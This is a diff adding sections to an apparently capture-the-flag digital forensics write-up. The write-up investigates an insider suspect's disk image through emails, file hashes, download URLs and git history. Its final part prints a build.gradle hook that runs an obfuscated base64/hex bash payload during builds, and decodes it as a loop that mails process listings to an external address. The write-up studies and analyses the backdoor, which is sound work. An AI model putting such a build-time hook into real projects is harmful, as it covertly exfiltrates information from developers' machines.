@@ -383,7 +383,7 @@ Login Count     : 6
   --> Password not required
   --> Password does not expire
 ```
-Then I realized from the lastloggedon check that anit.ghosh is a domain user from the PRAIVACYMATRIX domain instead of a local user so it wouldn't appear in the SAM hive.
+Then I realized from the lastloggedon check that anit.ghosh is a domain user from the PRAIVACYMATRIX domain instead of a local user so it wouldn't appear in the SAM hive. If we want information on user activity the ActiveDirectory database on the domain controller would be our best bet.
 
 That was a little more than necessary but I will say that **Anit Ghosh** is the laptop owner.
 
@@ -515,3 +515,288 @@ Anit Ghosh.
 Scrolling through we find evidence of Anit reaching out to people for the technical documentation. Here is the earliest email, sent to John on 05 Nov 2020 14:21:56 -0500.
 
 In the specified format it would be **2021-07-07 17:07:07 UTC**.
+
+4. What 3 employees should be asked questions about unauthorized requests from the suspect? Format: First Last, First Last, First Last
+
+Here we just need to look further into Anit's email files. Sent-1 and INBOX files contain the emails.
+```
+To: "noelle.johnson@praivacymatrix.com" <noelle.johnson@praivacymatrix.com>
+From: <anit.ghosh@praivacymatrix.com>
+Subject: Technical documentation
+Date: Thu, 05 Nov 2020 14:50:38 -0500
+Importance: normal
+X-Priority: 3
+Content-Type: multipart/alternative;
+        boundary="_EDA004E5-D6DF-48BF-B462-39C831CE2787_"
+
+--_EDA004E5-D6DF-48BF-B462-39C831CE2787_
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset="utf-8"
+
+Hey Noelle,
+
+I need your help! I accidentally deleted the new technical documentation fro=
+m my laptop. Literally erased it. I tried to get it from the corp server but c=
+ouldn=E2=80=99t do that.
+
+Could you help me get it? Send me a copy please! I will be very happy!
+
+Anit Ghosh.
+```
+```
+From: anit.ghosh@praivacymatrix.com
+Sent: 05 November 2020 14:23
+To: rachel.corbin@praivacymatrix.com
+Subject: Technical documentation
+
+Hey Rachel,
+
+It was a such fantastic game yesterday, have you seen it? The best one you ca=
+n watch!=20
+
+Otherwise I need some kind of help. I forgot to save technical documentatio=
+n of new product, can you send it to me?=20
+
+Anit Ghosh.
+```
+These two emails along with the one from the previous question we can see that Anit reached out to **John Finney**, **Noelle Johnson**, and **Rachel Corbin** about technical documentation.
+
+5. What is the SHA256 hash of the product documentation obtained by the suspect?
+
+I had seen earlier that there was only one document in Anit's directory that had a zone identifier (3 meaning downloaded from the Internet) so that where I looked first. Extracting and looking at the document shows this is confidential documentation for Project X. Anit has other files in his Documents folder with various names pertaining to "technical documentation" but they are for older or irrelevant systems and likely random documents found during the search.
+```
+fls -rp -o 1126400 SUSPECT.raw | grep 'pdf:Zone.Identifier'       
+r/r 110269-128-4:	Users/anit.ghosh/Documents/Doc_-_13_Feb_2021_-_13-40.pdf:Zone.Identifier
+
+fls -rp -o 1126400 SUSPECT.raw | grep 'Doc_-_13_Feb_2021_-_13-40'
+r/r 110269-128-1:	Users/anit.ghosh/Documents/Doc_-_13_Feb_2021_-_13-40.pdf
+r/r 110269-128-4:	Users/anit.ghosh/Documents/Doc_-_13_Feb_2021_-_13-40.pdf:Zone.Identifier
+
+icat -o 1126400 SUSPECT.raw 110269-128-4                         
+[ZoneTransfer]
+ZoneId=3
+
+icat -o 1126400 SUSPECT.raw 110269-128-1 > Doc_-_13_Feb_2021_-_13-40.pdf
+
+open Doc_-_13_Feb_2021_-_13-40.pdf
+
+shasum -a 256 Doc_-_13_Feb_2021_-_13-40.pdf 
+add33ea905399c5063bcc3437cb5c0436a2fd6deb086bb0ec5bf886f72767242  Doc_-_13_Feb_2021_-_13-40.pdf
+```
+The sha256 hash for the file is **add33ea905399c5063bcc3437cb5c0436a2fd6deb086bb0ec5bf886f72767242**.
+
+6. What employee has actually provided the suspect with the product documentation? Format: First name Last name Employee ID.
+
+When you open and start to look through the pdf documents you will see that someone badly copied this document to send and at the bottom of each page there is a black box redacting whatever information is behind it. This is likely the name of the owner of this document is redacted in an attempt to keep it from being traced back to them. So we need to figure out a way to see whats hidden.
+
+I could not find a way to do this from the command line. I tried pdf2text but was not getting any results because this is not a structured pdf just a hurried, scanned copy. To solve this I used a tool called Master PDF Editor. Then I simply open the pdf, entered document edit mode, and was able to separate the black box from the pdf to see what was behind.
+
+<img width="675" alt="image" src="https://github.com/garr3ttmjo/Writeups/assets/108881417/f4a47270-0f3a-4ffe-b5e1-384be1115808">
+
+Our culprit is **Mark Zukko 381**
+
+7. What URL did the suspect manage to obtain the product source code from? Exact, including file name
+If we remember earlier there was a gzip file in the user's Downloads directory that also appeared in their last browser activity being downloaded from git. Looking at the Zone Identifiier for this file give the download url. 
+```
+fls -o 1126400 SUSPECT.raw 83906-144-7
+r/r 84464-128-1:	desktop.ini
+r/r 100286-128-4:	Git-2.30.1-32-bit.exe
+r/r 100286-128-5:	Git-2.30.1-32-bit.exe:Zone.Identifier
+r/r 170295-128-6:	SDelete.zip
+r/r 170295-128-8:	SDelete.zip:Zone.Identifier
+r/r 58234-128-4:	xraicommend-761263a55b8cfed4bcb8f87cbbb68beaf2ec2423.tar.gz
+r/r 58234-128-9:	xraicommend-761263a55b8cfed4bcb8f87cbbb68beaf2ec2423.tar.gz:Zone.Identifier
+
+icat -o 1126400 SUSPECT.raw 58234-128-9
+[ZoneTransfer]
+ZoneId=3
+HostUrl=http://git.pm.internal/GBringley/xraicommend/archive/761263a55b8cfed4bcb8f87cbbb68beaf2ec2423.tar.gz
+```
+**http://git.pm.internal/GBringley/xraicommend/archive/761263a55b8cfed4bcb8f87cbbb68beaf2ec2423.tar.gz**
+
+8. What e-mail address did the suspect's backdoor code send reports to?
+So the user added a backdoor into some code they were working on. If we remember from their browser activity they were researching how to send an email from linux command line so its likely a bash command was added somewhere in their code. The adstresser is the only git repository in the user's directory and we know from the timeline that changes are actively being made to it.
+
+icat is only for extracting individual files so for extracting a directory like adstresser there is a different tool you need to use.
+
+tsk_recover - Export files from an image into a local directory, recovers files to the output_dir from the image.  By default recovers only unallocated files. With flags, it will export all files.
+
+First you need to get the inode for the adstresser directory which is 855-144-16. Then use the tsk_recover command with -a to specify allocated files, -o for the partition offset starting sector, the input image file, and then the output directory
+```
+fls -o 1126400 SUSPECT.raw 83898-144-6 | grep adstresser
+d/d 855-144-16:	adstresser
+
+tsk_recover -a -o 1126400 -d 855-144-16 SUSPECT.raw adstresser
+Files Recovered: 663
+
+ls -a adstresser 
+.		.git		README.md	gradle		gradlew.bat	src
+..		.gitignore	build.gradle	gradlew		settings.gradle
+```
+Now we have our git repository and we can start searching. The tree command will give you the structure of the directory but nothing sticks out to me. I also try some grep commands to search everything like grep -ri 'bash' * and grep -ri '\@' * but nothing pointing to bash execution or an email address shows up.
+```
+tree
+.
+├── README.md
+├── build.gradle
+├── gradle
+│   └── wrapper
+│       ├── gradle-wrapper.jar
+│       └── gradle-wrapper.properties
+├── gradlew
+├── gradlew.bat
+├── settings.gradle
+└── src
+    └── main
+        ├── java
+        │   ├── adstrxr
+        │   │   ├── EntrypointCallable1.java
+        │   │   ├── EntrypointSwitcher.java
+        │   │   ├── Switcheradstresser.java
+        │   │   ├── Switcheradstresser0.java
+        │   │   ├── iztk
+        │   │   │   └── pkhv
+        │   │   │       └── lggza
+        │   │   │           └── HodayaKiller.java
+        │   │   ├── qavy
+        │   │   │   └── hqb
+        │   │   │       └── odgn
+        │   │   │           └── xsffy
+        │   │   │               └── MyraEntity.java
+        │   │   ├── swtr
+        │   │   │   └── osh
+        │   │   │       └── btqa
+        │   │   │           └── hrb
+        │   │   │               └── maxc
+        │   │   │                   └── RaphaelFactory.java
+        │   │   └── tcrym
+        │   │       └── qkwhs
+        │   │           └── MarqueriteConcurrent.java
+        │   └── helpers
+        │       ├── AdstresserException.java
+        │       ├── ComplexConfig.java
+        │       ├── Config.java
+        │       ├── Context.java
+        │       ├── Main.java
+        │       ├── MyServlet.java
+        │       ├── SimpleConfig.java
+        │       ├── StatsReporter.java
+        │       └── StickyPathHelper.java
+        └── resources
+            └── logback.xml
+
+23 directories, 25 files
+```
+Since nothing sticks out in the current state of the repository its time to do some git forensics to see if changes were made to other branches of the repo. Starting off we will check the git logs. The most recent commit was to push the HEAD to master so HEAD is what we were looking at earlier. There are like 9 commits here and we can look at each with the git show command.
+```
+git log
+commit 5a404ec75b8a23efb8eba1e393cfea9b1a1dce77 (HEAD -> master, origin/master, origin/HEAD)
+Author: anitghosh <anitghosh@praivacymatrix.com>
+Date:   Sat Feb 13 00:25:09 2021 +0100
+
+    Added missing escape that lead to service disruptions in case of PEAR errors regarding connecting to database schema files to adjust the copyright file to batch load, and delete the var/test.log file.
+
+commit 3bea6b1fa984ee21ff25b2bd823465d0da9e59d2
+Author: anitghosh <anitghosh@praivacymatrix.com>
+Date:   Sat Feb 13 00:06:09 2021 +0100
+
+    Bugfix: Fixed error messages
+```
+```
+git show 5a404ec75b8a23efb8eba1e393cfea9b1a1dce77
+commit 5a404ec75b8a23efb8eba1e393cfea9b1a1dce77 (HEAD -> master, origin/master, origin/HEAD)
+Author: anitghosh <anitghosh@praivacymatrix.com>
+Date:   Sat Feb 13 00:25:09 2021 +0100
+
+    Added missing escape that lead to service disruptions in case of PEAR errors regarding connecting to database schema files to adjust the copyright file to batch load, and delete the var/test.log file.
+
+diff --git a/src/main/java/adstrxr/EntrypointCallable1.java b/src/main/java/adstrxr/EntrypointCallable1.java
+index 2feebda..1f8103e 100644
+--- a/src/main/java/adstrxr/EntrypointCallable1.java
++++ b/src/main/java/adstrxr/EntrypointCallable1.java
+@@ -11,8 +11,8 @@
+                                try {
+                                                        Switcheradstresser.call();
+ 
++                               }
+                                finally {
+-                                       helpers.StatsReporter.get().reportLatency(System.currentTimeMillis() - startTime);
+                                }
+                                return null;
+                        }
+```
+Going through each of the logs still doesn't show anything to do with a email backdoor. But if we remember to the timeline HEAD wasn't the only branch being worked on. There was also the wip branch, maybe for work in progress?
+```
+/Users/anit.ghosh/adstresser/.git/logs/refs/remotes/origin/HEAD
+/Users/anit.ghosh/adstresser/.git/logs/refs/remotes/origin/HEAD ($FILE_NAME)
+/Users/anit.ghosh/adstresser/.git/logs/refs/remotes/origin/wip
+/Users/anit.ghosh/adstresser/.git/logs/refs/remotes/origin/wip ($FILE_NAME)
+/Users/anit.ghosh/adstresser/.git/refs/remotes/origin/HEAD
+/Users/anit.ghosh/adstresser/.git/refs/remotes/origin/HEAD ($FILE_NAME)
+/Users/anit.ghosh/adstresser/.git/refs/remotes/origin/wip
+/Users/anit.ghosh/adstresser/.git/refs/remotes/origin/wip ($FILE_NAME)
+```
+So lets checkout the wip branch
+```
+git checkout wip
+```
+```
+git log
+commit 08bca1dbc17adfc214f8d40c57673e0571914ac1 (HEAD -> wip, origin/wip)
+Author: anitghosh <anitghosh@praivacymatrix.com>
+Date:   Wed Feb 10 13:54:12 2021 +0100
+
+    work in progress...
+
+commit 1593f051ebb584e7a624f84aeded280d32279a74
+Author: anitghosh <anitghosh@praivacymatrix.com>
+Date:   Sat Feb 6 23:37:03 2021 +0100
+
+    Speeded up stats-client-campaigns which was preventing adSelect hooks from the UI for demo purposes
+```
+```
+git show 08bca1dbc17adfc214f8d40c57673e0571914ac1
+commit 08bca1dbc17adfc214f8d40c57673e0571914ac1 (HEAD -> wip, origin/wip)
+Author: anitghosh <anitghosh@praivacymatrix.com>
+Date:   Wed Feb 10 13:54:12 2021 +0100
+
+    work in progress...
+
+diff --git a/build.gradle b/build.gradle
+index 7ba8717..5e0ef19 100644
+--- a/build.gradle
++++ b/build.gradle
+@@ -35,6 +35,10 @@ compileJava {
+ 
+ fatJar {
+        zip64 = true
++    exec {
++        executable 'bash'
++        args '-c', 'echo c2V0c2lkIGJhc2ggLWMgJCd3XHg2OFx4NjlceDZjZVx4MjBceDViXHgyMFx4NjBkYXRlXHgyMFx4MmJceDI1XHg3M1x4NjBceDIwXHgyZGx0XHgyMDE2MTMwMDE2MDBceDIwXHg1ZFx4M2JceDIwZG9ceDIwXHg2OWZceDIwcHNceDIwYXV4XHgyMFx4N2NceDIwZ3JlcFx4MjBceDJkcVx4MjBceDI3XHg1YnJceDVkdW50ZXN0c1x4MmVzaFx4MjBodHRwXHgzYVx4MmZceDJmXHgyN1x4M2JceDIwdGhlblx4MjBwc1x4MjBhdXhceDIwXHg3Y1x4MjBncmVwXHgyMHJceDc1bnRceDY1XHg3M1x4NzRceDczXHgyMFx4N2NceDIwbWFpbFx4MjBceDJkc1x4MjBHb3RpXHg3NFx4MjBhbGVyXHg3NDg3Mlx4MzgwXHgzMjczN1x4NDBwcm90b25tYWlsXHgyZWNvbVx4M2JceDIwc1x4NmNceDY1ZVx4NzBceDIwNjBceDNiXHgyMGZpXHgzYlx4MjBzXHg2Y1x4NjVlcFx4MjBceDMxXHgzYlx4MjBkb25ceDY1XHgyMFx4MjYnICY=|base64 -d|bash'
++    }
+        manifest {
+                attributes 'Main-Class': 'helpers.Main'
+        }
+```
+Now this is suspicious. A change was made to the build.gradle file executes a base64 bash command as part of the build process. Let's decode the string to see what is happening.
+```
+echo 'c2V0c2lkIGJhc2ggLWMgJCd3XHg2OFx4NjlceDZjZVx4MjBceDViXHgyMFx4NjBkYXRlXHgyMFx4MmJceDI1XHg3M1x4NjBceDIwXHgyZGx0XHgyMDE2MTMwMDE2MDBceDIwXHg1ZFx4M2JceDIwZG9ceDIwXHg2OWZceDIwcHNceDIwYXV4XHgyMFx4N2NceDIwZ3JlcFx4MjBceDJkcVx4MjBceDI3XHg1YnJceDVkdW50ZXN0c1x4MmVzaFx4MjBodHRwXHgzYVx4MmZceDJmXHgyN1x4M2JceDIwdGhlblx4MjBwc1x4MjBhdXhceDIwXHg3Y1x4MjBncmVwXHgyMHJceDc1bnRceDY1XHg3M1x4NzRceDczXHgyMFx4N2NceDIwbWFpbFx4MjBceDJkc1x4MjBHb3RpXHg3NFx4MjBhbGVyXHg3NDg3Mlx4MzgwXHgzMjczN1x4NDBwcm90b25tYWlsXHgyZWNvbVx4M2JceDIwc1x4NmNceDY1ZVx4NzBceDIwNjBceDNiXHgyMGZpXHgzYlx4MjBzXHg2Y1x4NjVlcFx4MjBceDMxXHgzYlx4MjBkb25ceDY1XHgyMFx4MjYnICY=' | base64 -d
+     
+setsid bash -c $'w\x68\x69\x6ce\x20\x5b\x20\x60date\x20\x2b\x25\x73\x60\x20\x2dlt\x201613001600\x20\x5d\x3b\x20do\x20\x69f\x20ps\x20aux\x20\x7c\x20grep\x20\x2dq\x20\x27\x5br\x5duntests\x2esh\x20http\x3a\x2f\x2f\x27\x3b\x20then\x20ps\x20aux\x20\x7c\x20grep\x20r\x75nt\x65\x73\x74\x73\x20\x7c\x20mail\x20\x2ds\x20Goti\x74\x20aler\x74872\x380\x32737\x40protonmail\x2ecom\x3b\x20s\x6c\x65e\x70\x2060\x3b\x20fi\x3b\x20s\x6c\x65ep\x20\x31\x3b\x20don\x65\x20\x26' &%
+```
+Then lets echo this hex string to deobfuscate it.
+```
+echo 'w\x68\x69\x6ce\x20\x5b\x20\x60date\x20\x2b\x25\x73\x60\x20\x2dlt\x201613001600\x20\x5d\x3b\x20do\x20\x69f\x20ps\x20aux\x20\x7c\x20grep\x20\x2dq\x20\x27\x5br\x5duntests\x2esh\x20http\x3a\x2f\x2f\x27\x3b\x20then\x20ps\x20aux\x20\x7c\x20grep\x20r\x75nt\x65\x73\x74\x73\x20\x7c\x20mail\x20\x2ds\x20Goti\x74\x20aler\x74872\x380\x32737\x40protonmail\x2ecom\x3b\x20s\x6c\x65e\x70\x2060\x3b\x20fi\x3b\x20s\x6c\x65ep\x20\x31\x3b\x20don\x65\x20\x26'
+
+while [ `date +%s` -lt 1613001600 ]; do if ps aux | grep -q '[r]untests.sh http://'; then ps aux | grep runtests | mail -s Gotit alert872802737@protonmail.com; sleep 60; fi; sleep 1; done &
+```
+```
+date -r 1613001600 
+Wed Feb 10 18:00:00 CST 2021
+```
+I see three main parts of this script
+* Run while date is less than Wed Feb 10 18:00:00 CST 2021
+* Check if runtests.sh process is running
+* Sent email to **alert872802737@protonmail.com** if true
+
+
